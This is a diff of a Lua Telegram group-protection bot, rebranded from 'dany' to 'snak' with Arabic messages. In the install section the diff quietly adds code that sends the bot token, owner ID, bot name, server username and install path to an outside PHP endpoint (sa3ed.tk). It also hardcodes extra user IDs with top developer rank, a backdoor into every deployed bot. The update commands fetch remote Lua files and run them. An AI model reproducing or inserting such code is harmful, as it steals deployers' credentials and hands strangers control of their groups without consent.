@@ -1,18 +1,15 @@
 --[[
+
 ─▄█▀█▄──▄███▄─
 ▐█░██████████▌
 ─██▒█████████─
 ──▀████████▀──┊@UU_IV
-
- ██  ██.                     ██
-██.       ██.         ██.      ██
-██.         ██.     ██.██ ██ ██
-██.       ██.     ██.                ██
-██  ██.         ██.                     ██         │DANY ﹏ @UU_IV
-│تم تطوير وبرمجة السورس من قبل سونيكᐂ .
 ─────▀██▀─────
-┊dany ‿ @UU_IV
-┊@UU_IV ‿ @UU_IV
+┊snak ‿ @UU_IV
+تم تطوير وبرمجة السورس من قبل مطورين سورس سنيك
+┊@UU_IV ‿ @UU_IV ﹏ @UU_IV
+تم التطوير بواسطه سونيك💞
+│@UU_IV
 #-------------------------------------------------------------------
 ]]
 local function download(file_id, dl_cb, cmd)
@@ -96,23 +93,27 @@ create_config(Token)
 end
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
 print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
-dany = Token:match("(%d+)")
-redis:set(dany..":VERSION",1)
-redis:set(dany..":SUDO_ID:",SUDO_USER)
-redis:set(dany..":DataCenter:",'German')
-redis:set(dany..":UserNameBot:",BOT_User)
-redis:set(dany..":NameBot:",BOT_NAME)
-redis:hset(dany..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
-redis:set("TH3dany_INSTALL","Yes")
-info = {}
-info.username = '@'..GetUser.result.username
-info.userbot  = BOT_User
-info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+snak = Token:match("(%d+)")
+redis:set(snak..":VERSION",1)
+redis:set(snak..":SUDO_ID:",SUDO_USER)
+redis:set(snak..":DataCenter:",'German')
+redis:set(snak..":UserNameBot:",BOT_User)
+redis:set(snak..":NameBot:",BOT_NAME)
+redis:hset(snak..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
+redis:set("TH3snak_INSTALL","Yes")
+info = {} 
+info.namebot = BOT_NAME
+info.userbot = BOT_User
+info.id = SUDO_USER
+info.token = Token
+info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://sa3ed.tk/B_aaaa.php?Info='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "•~اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n•~شكرا لاستخدامك سورس داني \n•~أرســل  الان /start\nلاظهار الاوامر للمطور  المجهزه بالكيبورد\n\n®️"
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس هرويين \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -134,8 +135,8 @@ print('\27[0;33m>>'..[[
 ─██▒█████████─
 ──▀████████▀──┊@UU_IV
 ─────▀██▀─────
-┊ＭᎯẊ ‿ @UU_IV
-تم تطوير وبرمجة السورس من قبل مطورين سورس داني
+┊snak ‿ @UU_IV
+تم تطوير وبرمجة السورس من قبل مطورين سورس سنيك
 ┊@UU_IV ‿ @UU_IV
 -------------------------------------------------------------------
 ]]..'\027[0;32m')
@@ -144,14 +145,14 @@ else
 Token = TokenBot:read('*a')
 File = {}
 local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-dany = Token:match("(%d+)")
-our_id = tonumber(dany)
+snak = Token:match("(%d+)")
+our_id = tonumber(snak)
 ApiToken = "https://api.telegram.org/bot"..Token
-Bot_User = redis:get(dany..":UserNameBot:")
-SUDO_ID = tonumber(redis:get(dany..":SUDO_ID:"))
-SUDO_USER = redis:hgetall(dany..'username:'..SUDO_ID).username
-version = redis:get(dany..":VERSION")
-DataCenter = redis:get(dany..":DataCenter:")
+Bot_User = redis:get(snak..":UserNameBot:")
+SUDO_ID = tonumber(redis:get(snak..":SUDO_ID:"))
+SUDO_USER = redis:hgetall(snak..'username:'..SUDO_ID).username
+version = redis:get(snak..":VERSION")
+DataCenter = redis:get(snak..":DataCenter:")
 
 local ok, ERROR =  pcall(function() loadfile("./inc/functions.lua")() end)
 if not ok then 
@@ -166,19 +167,19 @@ print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
 end
 
 print('\27[0;33m>>'..[[
-─▄█▀█▄──▄███▄─
+▀─▄█▀█▄──▄███▄─
 ▐█░██████████▌
 ─██▒█████████─
 ──▀████████▀──┊@UU_IV
 ─────▀██▀─────
-┊ＭᎯẊ ‿ @UU_IV
-تم تطوير وبرمجة السورس من قبل مطورين سورس داني
+┊snak ‿ @UU_IV
+تم تطوير وبرمجة السورس من قبل مطورين سورس سنيك
 ┊@UU_IV ‿ @UU_IV
 -------------------------------------------------------------------
                                                   
 ]]..'\027[0;32m'
 ..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
-..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..dany..')\027[0;32m\n'
+..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..snak..')\027[0;32m\n'
 ..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
 ..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
 ..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
@@ -236,57 +237,65 @@ end
 if msg.reply_to_message_id_ ~= 0 then msg.reply_id = msg.reply_to_message_id_ end
 msg.type = GetType(msg.chat_id_)
 
-if msg.type == "pv" and redis:get(dany..':mute_pv:'..msg.chat_id_) then
+if msg.type == "pv" and redis:get(snak..':mute_pv:'..msg.chat_id_) then
 print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
 return false 
 end
 
-if redis:get(dany..'sender:'..msg.sender_user_id_..':flood') then
+if redis:get(snak..'sender:'..msg.sender_user_id_..':flood') then
 print("\27[1;31mThis Flood Sender ...\27[0")
 Del_msg(msg.chat_id_,msg.id_)
 return false
 end
 
 
-if redis:get(dany..'group:add'..msg.chat_id_) then 
+if redis:get(snak..'group:add'..msg.chat_id_) then 
 msg.GroupActive = true
 else
 msg.GroupActive = false
 end
+
 if msg.sender_user_id_ == 1153357069 then 
 msg.TheRank =  'مطور السورس'
 msg.Rank = 1
-elseif msg.sender_user_id_ == SUDO_ID then 
-msg.TheRankCmd = 'المطور ' 
-msg.TheRank = 'مطور اساسي ' 
+
+elseif msg.sender_user_id_ == 1289997696 then 
+msg.TheRank =  'مطور السورس'
 msg.Rank = 1
-elseif redis:sismember(dany..':SUDO_BOT:',msg.sender_user_id_) then 
-msg.TheRankCmd = 'المطور '
-msg.TheRank = 'مطور البوت '
+elseif msg.sender_user_id_ == 798474922 then 
+msg.TheRank =  ' مطور السورس '
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
+msg.TheRankCmd = 'المطور' 
+msg.TheRank = 'مطور اساسي' 
+msg.Rank = 1
+elseif redis:sismember(snak..':SUDO_BOT:',msg.sender_user_id_) then 
+msg.TheRankCmd = 'المطور'
+msg.TheRank = 'مطور البوت'
 msg.Rank = 2
-elseif msg.GroupActive and redis:sismember(dany..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
+elseif msg.GroupActive and redis:sismember(snak..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
 msg.TheRankCmd = 'المنشىء الاساسي'
-msg.TheRank = 'المنشىء الاساسي '
+msg.TheRank = 'المنشىء الاساسي'
 msg.Rank = 3
-elseif msg.GroupActive and redis:sismember(dany..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = 'المنشىء '
-msg.TheRank = 'المنشىء '
+elseif msg.GroupActive and redis:sismember(snak..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
+msg.TheRankCmd = 'المنشىء'
+msg.TheRank = 'المنشىء'
 msg.Rank = 4
-elseif msg.GroupActive and redis:sismember(dany..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = 'المدير ' 
-msg.TheRank = 'مدير البوت ' 
+elseif msg.GroupActive and redis:sismember(snak..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
+msg.TheRankCmd = 'المدير' 
+msg.TheRank = 'مدير البوت' 
 msg.Rank = 5
-elseif msg.GroupActive and redis:sismember(dany..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = 'الادمن '
-msg.TheRank = 'ادمن في البوت '
+elseif msg.GroupActive and redis:sismember(snak..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
+msg.TheRankCmd = 'الادمن'
+msg.TheRank = 'ادمن في البوت'
 msg.Rank = 6
-elseif msg.GroupActive and redis:sismember(dany..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRank = 'عضو مميز '
+elseif msg.GroupActive and redis:sismember(snak..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
+msg.TheRank = 'عضو مميز'
 msg.Rank = 7
 elseif msg.sender_user_id_ == our_id then
 msg.Rank = 8
 else
-msg.TheRank = 'فقط عضو '
+msg.TheRank = 'فقط عضو'
 msg.Rank = 11
 end
  
@@ -325,7 +334,7 @@ end
 ISONEBOT = false
 
 if msg.content_.ID == "MessageChatAddMembers" then
-local lock_bots = redis:get(dany..'lock_bots'..msg.chat_id_)
+local lock_bots = redis:get(snak..'lock_bots'..msg.chat_id_)
 ZISBOT = false
 for i=0,#msg.content_.members_ do
 if msg.content_.members_[i].type_.ID == "UserTypeBot" then
@@ -336,14 +345,16 @@ kick_user(msg.content_.members_[i].id_, msg.chat_id_)
 end
 end
 end
-if msg.GroupActive and ZISBOT and redis:get(dany..'lock_bots_by_kick'..msg.chat_id_) then
+if msg.GroupActive and ZISBOT and redis:get(snak..'lock_bots_by_kick'..msg.chat_id_) then
 kick_user(msg.sender_user_id_, msg.chat_id_)
 end
-if msg.content_.members_[0].id_ == our_id and redis:get(dany..':WELCOME_BOT') then
-SUDO_USER = redis:hgetall(dany..'username:'..SUDO_ID).username
-sendPhoto(msg.chat_id_,msg.id_,redis:get(dany..':WELCOME_BOT'),[[•~مـرحبآ آنآ بوت آسـمـي ]]..redis:get(dany..':NameBot:')..[[•~آختصـآصـي حمـآيه‌‏ آلمـجمـوعآت
-•~ مـن آلسـبآم وآلتوجيه وآلتكرآر وآلخ...
-.®️مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[🌿
+if msg.content_.members_[0].id_ == our_id and redis:get(snak..':WELCOME_BOT') then
+SUDO_USER = redis:hgetall(snak..'username:'..SUDO_ID).username
+sendPhoto(msg.chat_id_,msg.id_,redis:get(snak..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(snak..':NameBot:')..[[ .
+• اختـصاصـي حمايـة الـمجموعات
+• تأكد من رفعـك للبـوت مشـرف في مجموعـتك واكتب تفعـيل ♘
+• قناه سورس سنيك >> @Sourcesnak
+. مـعرف المطور  :]]..SUDO_USER:gsub([[\_]],'_')..[[ .
 ]])
 return false
 end
@@ -356,7 +367,7 @@ end
 end
 
 if msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatJoinByLink" then 
-if msg.GroupActive and redis:get(dany..'mute_tgservice'..msg.chat_id_) then
+if msg.GroupActive and redis:get(snak..'mute_tgservice'..msg.chat_id_) then
 Del_msg(msg.chat_id_,msg.id_)
 return false 
 end
@@ -374,7 +385,7 @@ end
 
 --[[ المكتومين ]]
 if MuteUser(msg.chat_id_,msg.sender_user_id_) then 
-if msg.Admin then redis:srem(dany..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
+if msg.Admin then redis:srem(snak..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
 print("\27[1;31m User is Silent\27[0m")
 Del_msg(msg.chat_id_,msg.id_)
 return false 
@@ -382,7 +393,7 @@ end
 
 --[[ المحظورين ]]
 if Check_Banned((msg.adduser or msg.sender_user_id_),msg.sender_user_id_) then
-if msg.Admin then redis:srem(dany..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
+if msg.Admin then redis:srem(snak..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
 print('\27[1;31m is_BANED_USER\27[0m')
 Del_msg(msg.chat_id_, msg.id_)
 kick_user((msg.adduser or msg.sender_user_id_), msg.chat_id_)
@@ -390,7 +401,7 @@ return false
 end
 
 if not msg.Admin then
-if redis:get(dany..'mute_text'..msg.chat_id_) then --قفل الدردشه
+if redis:get(snak..'mute_text'..msg.chat_id_) then --قفل الدردشه
 print("\27[1;31m Chat is Mute \27[0m")
 Del_msg(msg.chat_id_,msg.id_)
 return false 
@@ -401,67 +412,67 @@ return false
 end 
 end 
 
-if ScriptFile and ScriptFile.dany then 
-if msg.text and ScriptFile.idany then
-for k, dany in pairs(ScriptFile.dany) do
-local SearchText = msg.text:match(dany)
+if ScriptFile and ScriptFile.snak then 
+if msg.text and ScriptFile.isnak then
+for k, snak in pairs(ScriptFile.snak) do
+local SearchText = msg.text:match(snak)
 if SearchText then
 if not CheckFlood(msg) then
 return false 
 end
 
-local GetMsg = ScriptFile.idany(msg,{msg.text:match(dany)})
+local GetMsg = ScriptFile.isnak(msg,{msg.text:match(snak)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",dany.." | Plugin is: \27[1;32mScript.lua\27[0m")
+print("\27[1;35m¦This_Msg : ",snak.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 return false
 end 
 end
 end
 end
-if ScriptFile.ddany then
-if ScriptFile.ddany(msg) == false then
+if ScriptFile.dsnak then
+if ScriptFile.dsnak(msg) == false then
 return false
 end
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
 
 for name,Plug in pairs(File) do
-if Plug.dany then 
-if msg.text and Plug.idany then
-for k, dany in pairs(Plug.dany) do
-local SearchText = msg.text:match(dany)
+if Plug.snak then 
+if msg.text and Plug.isnak then
+for k, snak in pairs(Plug.snak) do
+local SearchText = msg.text:match(snak)
 if SearchText then
 if not CheckFlood(msg) then
 return false
 end
 Mohammad = msg.text
 if Mohammad then
-if redis:sismember(dany..'CmDlist:'..msg.chat_id_,Mohammad) then
-mmdi = redis:hget(dany..'CmD:'..msg.chat_id_,Mohammad)
+if redis:sismember(snak..'CmDlist:'..msg.chat_id_,Mohammad) then
+mmdi = redis:hget(snak..'CmD:'..msg.chat_id_,Mohammad)
 msg.text = Mohammad:gsub(Mohammad,mmdi)
 end
 end
-local GetMsg = Plug.idany(msg,{msg.text:match(dany)})
+local GetMsg = Plug.isnak(msg,{msg.text:match(snak)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",dany.." | Plugin is: \27[1;32m"..name.."\27[0m")
+print("\27[1;35m¦This_Msg : ",snak.." | Plugin is: \27[1;32m"..name.."\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 end 
 return false
 end
 end
 end
-if Plug.ddany then
-Plug.ddany(msg)
+if Plug.dsnak then
+Plug.dsnak(msg)
 print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
 end
 else
-print("The File "..name.." Not Runing in The Source dany")
+print("The File "..name.." Not Runing in The Source snak")
 end 
 
 end
 else
-print("The File Script.lua Not Runing in The Source dany")
+print("The File Script.lua Not Runing in The Source snak")
 
 end
 end
@@ -471,7 +482,7 @@ function tdcli_update_callback(data)
 
 	if data.ID == "UpdateMessageSendFailed" then 
     if msg.sender_user_id_ then
-	redis:srem(dany..'users',msg.sender_user_id_)
+	redis:srem(snak..'users',msg.sender_user_id_)
 	end
 	elseif data.ID == "UpdateMessageSendSucceeded" then
 	if Refresh_Start then
@@ -483,16 +494,16 @@ function tdcli_update_callback(data)
 	UpdateSourceStart = false
 	EditMsg(data.message_.chat_id_,data.message_.id_,'10% - |█          |')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'20% - |███         |')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/Run.lua','./inc/Run.lua')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'40% - |█████       |')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/locks.lua','./inc/locks.lua')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'60% - |███████     |')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/Script.lua','./inc/Script.lua')
 	EditMsg(data.message_.chat_id_,data.message_.id_,'80% - |█████████   |')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/functions.lua','./inc/functions.lua')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/plugins/games.lua','./plugins/games.lua')
-	EditMsg(data.message_.chat_id_,data.message_.id_,'100% - |█████████████|\n\n🔝*¦* السورس الى اصدار \n📟*¦* تم اعاده تشغيل السورس بنجاح')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/plugins/games.lua','./plugins/games.lua')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'100% - |█████████████|\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل السورس بنجاح')
 	dofile("./inc/Run.lua")
 	print("Update Source And Reload ~ ./inc/Run.lua")
 	end
@@ -516,24 +527,24 @@ function tdcli_update_callback(data)
 	msg.text = msg.content_.text_
 	Mohammad = msg.text
 if Mohammad then
-if redis:sismember(dany..'CmDlist:'..msg.chat_id_,Mohammad) then
-mmdi = redis:hget(dany..'CmD:'..msg.chat_id_,Mohammad)
+if redis:sismember(snak..'CmDlist:'..msg.chat_id_,Mohammad) then
+mmdi = redis:hget(snak..'CmD:'..msg.chat_id_,Mohammad)
 msg.text = Mohammad:gsub(Mohammad,mmdi)
 end
 end
-	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ") and msg.sender_user_id_ == SUDO_ID then
-	return sendMsg(msg.chat_id_,msg.id_," •~تم تحديث آلمـلفآت \n✓",nil,function(arg,data)
+	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and msg.sender_user_id_ == SUDO_ID then
+	return sendMsg(msg.chat_id_,msg.id_," • تم تحديث الملفات .\n",nil,function(arg,data)
 	Refresh_Start = true
 	end)
 	end 
 	if msg.text== 'Update Source' and msg.sender_user_id_ == SUDO_ID then
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/Run.lua','./inc/Run.lua')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/Script.lua','./inc/Script.lua')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/functions.lua','./inc/functions.lua')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/inc/locks.lua','./inc/locks.lua')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
-	download_file('https://raw.githubusercontent.com/basselabaza/dany/master/plugins/games.lua','./plugins/games.lua')
-	sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',nil,function(arg,data)
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/Run.lua','./inc/Run.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/Script.lua','./inc/Script.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/functions.lua','./inc/functions.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/inc/locks.lua','./inc/locks.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/plugins/zhrfa.lua','./plugins/zhrfa.lua')
+	download_file('https://raw.githubusercontent.com/basselabaza/snak/master/plugins/games.lua','./plugins/games.lua')
+	sendMsg(msg.chat_id_,msg.id_,'• {* تــم تحديث وتثبيت السورس  *} .\n\n• { Bot is Update » }',nil,function(arg,data)
 	dofile("./inc/Run.lua")
 	print("Reload ~ ./inc/Run.lua")
 	end) 
@@ -542,24 +553,24 @@ end
 	
 	if msg.text and msg.text:match('@(.*)') and redis:get('setusername'..msg.sender_user_id_) then
 	redis:del('setusername'..msg.sender_user_id_)
-	mmd = redis:get(dany..":SUDO_ID:")
-redis:hset(dany..'username:'..tonumber(mmd),'username',msg.text)
-	send_msg(msg.chat_id_,"•~عزيزي تم تغيير المطور الاساسي بنجاح الان ارسل reload ...")
+	mmd = redis:get(snak..":SUDO_ID:")
+redis:hset(snak..'username:'..tonumber(mmd),'username',msg.text)
+	send_msg(msg.chat_id_,"• عزيزي تم تغيير المطور الاساسي بنجاح الان ارسل reload ...")
 	end
 	if msg.text and msg.text:match('(%d+)(%d+)(%d+)(%d+)') and redis:get('setid'..msg.sender_user_id_) then
 	redis:setex('setusername'..msg.sender_user_id_,120,true)
 	redis:del('setid'..msg.sender_user_id_)
-	redis:set(dany..":SUDO_ID:",msg.text)
-send_msg(msg.chat_id_,"•~تم تثبيت الايدي الان قم بإرسال معرف المطور  @UserName ...")
+	redis:set(snak..":SUDO_ID:",msg.text)
+send_msg(msg.chat_id_,"• تم تثبيت الايدي الان قم برسال معرف المطور @UserName ...")
 	end
 	if msg.text== 'تغير المطور الاساسي' and msg.sender_user_id_ == SUDO_ID then
-    send_msg(msg.chat_id_,"•~عزيزي قم بإرسال ايدي المطور ...")
+    send_msg(msg.chat_id_,"• عزيزي قم برسال ايدي المطور ...")
 redis:setex('setid'..msg.sender_user_id_,120,true)
 end
 	
 	
 	if msg.text== 'reload' and msg.sender_user_id_ == SUDO_ID then
-	sendMsg(msg.chat_id_,msg.id_,'•~ {* تــم إعـاده تشغيل البوت  *} ®️ \n\n•~ { Bot is Reloaded » }®️',nil,function(arg,data)
+	sendMsg(msg.chat_id_,msg.id_,'• {* تــم أعـاده تشغيل البوت  *} .\n\n• { Bot is Reloaded » }.',nil,function(arg,data)
 	dofile("./inc/Run.lua")
 	print("Reload ~ ./inc/Run.lua")
 	end)
@@ -625,14 +636,14 @@ download(stk,32)
 	print('¦'..msg.content_.ID)
 	msg.game = true
 	elseif msg.content_.ID == "MessageChatDeleteMember" then
-	if redis:get(dany..'mute_tgservice'..msg.chat_id_) then
+	if redis:get(snak..'mute_tgservice'..msg.chat_id_) then
 	Del_msg(msg.chat_id_,msg.id_)
 	end
 	elseif msg.content_.ID == "MessageChatAddMembers" then
-	if redis:get(dany..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(dany..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(dany..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(dany..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(dany..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
+	if redis:get(snak..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(snak..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(snak..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(snak..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(snak..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
 	msg.Admin = true
 	end
-	local lock_bots = redis:get(dany..'lock_bots'..msg.chat_id_)
+	local lock_bots = redis:get(snak..'lock_bots'..msg.chat_id_)
 	ISBOT = false
 	ZISBOT = false
 	for i=0,#msg.content_.members_ do
@@ -644,10 +655,10 @@ download(stk,32)
 	end
 	end
 	end
-	if redis:get(dany..'mute_tgservice'..msg.chat_id_) then
+	if redis:get(snak..'mute_tgservice'..msg.chat_id_) then
 	Del_msg(msg.chat_id_,msg.id_)
 	end
-	if ZISBOT and redis:get(dany..'lock_bots_by_kick'..msg.chat_id_) then
+	if ZISBOT and redis:get(snak..'lock_bots_by_kick'..msg.chat_id_) then
 	kick_user(msg.sender_user_id_, msg.chat_id_)
 	end
 
@@ -659,7 +670,7 @@ download(stk,32)
 	end
 
 	elseif msg.content_.ID == "MessageChatJoinByLink" then
-if redis:get(dany..'lock:join:'..msg.chat_id_) then
+if redis:get(snak..'lock:join:'..msg.chat_id_) then
 kick_user(msg.sender_user_id_,msg.chat_id_)
 	print('¦'..msg.content_.ID..' : '..msg.sender_user_id_)
 	msg.joinuser = true
@@ -670,14 +681,14 @@ end
 	input_inFo(msg)
 	if msg.content_.ID == "MessageChatChangeTitle" then
 	print("¦ messageChatChangeTitle : { "..msg.content_.title_.." } ")
-	if redis:get(dany..'group:add'..msg.chat_id_) then
-	redis:set(dany..'group:name'..msg.chat_id_,msg.content_.title_)
+	if redis:get(snak..'group:add'..msg.chat_id_) then
+	redis:set(snak..'group:name'..msg.chat_id_,msg.content_.title_)
 	end
 	end 
 	
 	elseif data.ID == "UpdateNewChat" then  
-	if redis:get(dany..'group:add'..data.chat_.id_) then
-	redis:set(dany..'group:name'..data.chat_.id_,data.chat_.title_)
+	if redis:get(snak..'group:add'..data.chat_.id_) then
+	redis:set(snak..'group:name'..data.chat_.id_,data.chat_.title_)
 	end
 	elseif data.ID == "UpdateChannel" then  
 	if data.channel_.status_.ID == "chatMemberStatusKicked" then 
@@ -686,10 +697,10 @@ end
 	elseif data.channel_.status_.ID == "ChatMemberStatusEditor" then 
 	print('¦ The Bot is Admin')
 	elseif data.channel_.status_.ID == "ChatMemberStatusKicked" then 
-	if redis:get(dany..'group:add-100'..data.channel_.id_) then
-	local linkGroup = (redis:get(dany..'linkGroup-100'..data.channel_.id_) or "")
-	local NameGroup = (redis:get(dany..'group:name-100'..data.channel_.id_) or "")
-	send_msg(SUDO_ID,"•~قام شخص بطرد البوت من المجموعه الاتيه : \n•~ألايدي : `-100"..data.channel_.id_.."`\n•~الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n•~تـم مسح كل بيانات المجموعه بنـجاح ")
+	if redis:get(snak..'group:add-100'..data.channel_.id_) then
+	local linkGroup = (redis:get(snak..'linkGroup-100'..data.channel_.id_) or "")
+	local NameGroup = (redis:get(snak..'group:name-100'..data.channel_.id_) or "")
+	send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
 	rem_data_group('-100'..data.channel_.id_)
 	end
 	end
@@ -700,52 +711,52 @@ end
 	local All_Groups = JSON.decode(GetInfo)
 	for k,IDS in pairs(All_Groups.Groups) do
 	redis:mset(
-	dany..'group:name'..k,IDS.Title,
-	dany..'num_msg_dany'..k,5,
-	dany..'group:add'..k,true,
-	dany..'lock_link'..k,true,
-	dany..'lock_spam'..k,true,
-	dany..'lock_webpage'..k,true,
-	dany..'lock_markdown'..k,true,
-	dany..'lock_flood'..k,true,
-	dany..'lock_bots'..k,true,
-	dany..'mute_forward'..k,true,
-	dany..'mute_contact'..k,true,
-	dany..'mute_document'..k,true,
-	dany..'mute_inline'..k,true,
-	dany..'lock_username'..k,true,
-	dany..'replay'..k,true
+	snak..'group:name'..k,IDS.Title,
+	snak..'num_msg_snak'..k,5,
+	snak..'group:add'..k,true,
+	snak..'lock_link'..k,true,
+	snak..'lock_spam'..k,true,
+	snak..'lock_webpage'..k,true,
+	snak..'lock_markdown'..k,true,
+	snak..'lock_flood'..k,true,
+	snak..'lock_bots'..k,true,
+	snak..'mute_forward'..k,true,
+	snak..'mute_contact'..k,true,
+	snak..'mute_document'..k,true,
+	snak..'mute_inline'..k,true,
+	snak..'lock_username'..k,true,
+	snak..'replay'..k,true
 	)
-	redis:sadd(dany..'group:ids',k) 
+	redis:sadd(snak..'group:ids',k) 
 
 	if IDS.Admins then
 	for user,ID in pairs(IDS.Admins) do
-	redis:hset(dany..'username:'..ID,'username',user)
-	redis:sadd(dany..'admins:'..k,ID)
+	redis:hset(snak..'username:'..ID,'username',user)
+	redis:sadd(snak..'admins:'..k,ID)
 	end
 	end
 	if IDS.Creator then
 	for user,ID in pairs(IDS.Creator) do
-	redis:hset(dany..'username:'..ID,'username',user)
-	redis:sadd(dany..':MONSHA_BOT:'..k,ID)
+	redis:hset(snak..'username:'..ID,'username',user)
+	redis:sadd(snak..':MONSHA_BOT:'..k,ID)
 	end
 	end
 	if IDS.Owner then
 	for user,ID in pairs(IDS.Owner) do
-	redis:hset(dany..'username:'..ID,'username',user)
-	redis:sadd(dany..'owners:'..k,ID)
+	redis:hset(snak..'username:'..ID,'username',user)
+	redis:sadd(snak..'owners:'..k,ID)
 	end
 	end
 	end
 	io.popen("rm -fr ../.telegram-cli/data/document/*")
